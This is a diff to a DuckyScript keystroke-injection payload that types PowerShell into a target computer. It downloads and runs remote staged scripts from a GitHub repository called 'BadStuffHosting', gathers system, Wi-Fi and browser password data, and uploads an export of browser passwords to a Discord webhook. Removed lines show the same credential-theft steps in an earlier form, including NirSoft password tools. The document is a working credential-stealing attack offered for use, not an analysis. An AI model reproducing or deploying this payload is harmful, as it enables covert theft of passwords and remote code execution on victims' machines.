@@ -26,17 +26,7 @@ DELAY 1000
 REM edit your webhook here
 STRING $DiscordUrl = 'DISCORD_WEBHOOK'
 ENTER
-STRING iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Gvte-Kali/BadStuffHosting/main/W1ns1d3r/payload.ps1'))
-ENTER
-DELAY 1000
-STRING version-av
-ENTER
-STRING SysInfo
-ENTER
-DELAY 10000
-STRING Wifi
-ENTER
-STRING Get-Nirsoft
+STRING iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Gvte-Kali/BadStuffHosting/main/W1ns1d3r/stage1.ps1'))
 ENTER
 DELAY 5000
 STRING wbpv28821@
@@ -52,9 +42,7 @@ ENTER
 DELAY 1000
 ALT F4
 DELAY 800
-STRING Upload-Discord -file "C:\temp\export.txt" -text "Browser passwords :"
+STRING Upload-Discord -file "C:\temp\export.txt" -text "Browser password :"
 ENTER
-STRING Del-Nirsoft-File
-ENTER
-STRING EXIT
+STRING iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Gvte-Kali/BadStuffHosting/main/W1ns1d3r/stage2.ps1'))
 ENTER
